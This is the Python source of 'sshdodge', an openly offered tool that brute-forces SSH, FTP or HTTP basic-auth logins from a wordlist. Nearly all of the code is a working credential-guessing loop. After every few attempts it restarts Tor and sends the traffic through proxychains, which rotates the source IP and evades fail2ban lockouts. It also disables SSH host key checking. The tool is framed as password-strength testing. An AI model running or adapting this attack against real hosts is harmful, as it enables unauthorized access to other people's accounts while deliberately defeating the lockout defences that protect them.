#!/usr/bin/python

"""
SSHDODGE
Tool used to test weakness of some ssh passwords, thanks to a dictionary attack (bypassing fail to ban protection).

Copyright (C) 2017  Neetx

This file is part of sshdodge.

Sshdodge is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

Sshdodge is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>

CONTACTS:
	- neetx@protonmail.com
"""

import os, sys, argparse, time, subprocess, socket
from dependences import manage_dependences
from validators import (
	ipValidator,
	portValidator,
	checkWordlist,
	positiveIntegerValidation,
	positiveFloatValidation,
	userValidator
	)

def image():
	print"          _         _           _             "
	print"         | |       | |         | |            "
	print"  ___ ___| |__   __| | ___   __| | __ _  ___  "
	print" / __/ __| '_ \ / _` |/ _ \ / _` |/ _` |/ _ \ "
	print" \__ \__ \ | | | (_| | (_) | (_| | (_| |  __/ "
	print" |___/___/_| |_|\__,_|\___/ \__,_|\__, |\___| "
	print"                                   __/ |      "
	print"                                  |___/       "
	print"                             Powered by Neetx "

def rootCheck():
	if os.geteuid() == 0:
		return True
	else:
		return False

def argvcontrol():

	if (len(sys.argv) >= 1):
		h = False
		t = False
		for arg in sys.argv:
			if arg == "-h" or arg == "--help":
				h = True
			if arg == "-t" or arg == "--test":
				t = True
		if h:
			image()
		if t:
			manage_dependences()

	parser = argparse.ArgumentParser(epilog="Ex: sudo ./sshdodge.py wordlist.txt -i 127.0.0.1 -p 22 -a 3 -b pass -c root")
	parser.add_argument("wordlist", help="Wordlist for dictionary attack")
	parser.add_argument("-b","--bruteforce", help="The bruteforce attack type (user, pass)", default="pass")
	parser.add_argument("-c","--credential", help="Constant credential (user, pass) value depending on the bruteforce attack type", default="root")
	parser.add_argument("-i","--ip", help="Destination ip address or hostname", default="127.0.0.1")
	parser.add_argument("-p","--port", help="Destination port", default="22")
	parser.add_argument("-a","--attempts", help="Number of attempts before identity change", default="3")
	parser.add_argument("-w","--wait", help="Waiting time after Tor service restart (in seconds)", default="1")
	parser.add_argument("-o","--timeout", help="Timeout for each attempt (in seconds)", default="30")
	parser.add_argument("-s","--service", help="The targeted service: ssh, ftp, http", default='ssh')
	parser.add_argument("-t","--test", help="Use the to test dependences", action='store_true', default=False)
	args = parser.parse_args()

	valid = True
	if args.bruteforce == "user":
		if not userValidator(args.credential):
			print "[!] Invalid User format"
			valid = False
	elif args.bruteforce == "pass":
		pass
	else:
		print "[!] Invalid bruteforce type, choose between: user, pass"
		valid = False
	if not ipValidator(args.ip):
		print "[!] Invalid Hostname or Ip Address"
		valid = False
	if not portValidator(args.port):
		print"[!] Invalid Port"
		valid = False
	if not checkWordlist(args.wordlist):
		print "[!] Wordlist not found"
		valid = False
	if not positiveIntegerValidation(args.attempts):
		print "[!] Attempts invalid"
		valid = False
	if not positiveFloatValidation(args.wait):
		print "[!] Wait time invalid"
		valid = False
	if not positiveFloatValidation(args.timeout):
		print "[!] Timeout invalid"
		valid = False
	if args.service != "ssh" and args.service != "ftp" and args.service != "http":
		print "[!] Invalid service, choose between: ssh, ftp, http"
		valid = False

	return valid, args

def wait_timeout(proc, seconds):
	"""
	Wait for a process to finish, or raise exception after timeout
	"""
	start = time.time()
	end = start + seconds
	interval = min(seconds / 1000.0, .25)

	while True:
		result = proc.poll()
		if result is not None:
			return result
		if time.time() >= end:
			raise RuntimeError("Process timed out")
		time.sleep(interval)


def main():

	try:
		if rootCheck():
			pass
		else:
			print "[!] You should run with root permissions"
			exit()

		check = argvcontrol()
		if check[0]:

			image()

			bruteforce = check[1].bruteforce
			ip = socket.gethostbyname(check[1].ip)
			port = check[1].port
			wordlist = check[1].wordlist
			attempts = int(check[1].attempts)
			wait = float(check[1].wait)
			timeout = float(check[1].timeout)
			service = check[1].service
			user = ""
			password = ""

			if bruteforce == "user":
				password = check[1].credential
			elif bruteforce == "pass":
				user = user = check[1].credential
			
			f = open(wordlist)
			c = 0

			subprocess.call(['service', 'tor', 'restart'])
			print '[*] Public IP changed to:'
			time.sleep(wait)
			subprocess.call(['proxychains', '-q', 'curl', 'https://ipinfo.io/ip'])
			print


			for line in f:
				if(c == attempts):
					c = 0
					subprocess.call(['service', 'tor', 'reload'])
					print '[*] Public IP changed to:'
					time.sleep(wait)
					subprocess.call(['proxychains', '-q', 'curl', 'https://ipinfo.io/ip'])
					print

				print '\nWe\' re trying with: ' + line
				if bruteforce == "user":
					user =  line[:-1]
				elif bruteforce == "pass":
					password = line[:-1]

				if service == "ssh":
					var = 'proxychains sshpass -p ' + password + ' ssh -o StrictHostKeyChecking=no ' + user + '@' + ip + ' -p ' + port
				elif service == "ftp":
					var = 'proxychains ftp ftp://' + user + ':' + password + '@' + ip
				elif service == "http":
					var = 'proxychains curl -i -sSu ' + user + ':' + password + ' ' + ip
				var_list = var.split(' ')

				try:
					print '[*] Running Command: ' + var
					subp = subprocess.Popen(var_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
					wait_timeout(subp, timeout)
					out, err = subp.communicate()
					print '[*] Process Output:\n' + out, err
					# Specific check for HTTP (does not conflict with ssh, ftp)
					if out.find("HTTP/1.1 2") >= 0:
						print '[*] Found successful HTTP response with:\n' + var
						exit()
					print '[!] Returned Status Code: ' + str(subp.returncode)
					c += 1
				except RuntimeError:
					print '\n[*] Process timed out, continuing to next attempt...'
					continue

	except (KeyboardInterrupt, SystemExit):
		exit()

if __name__ == "__main__":
	main()
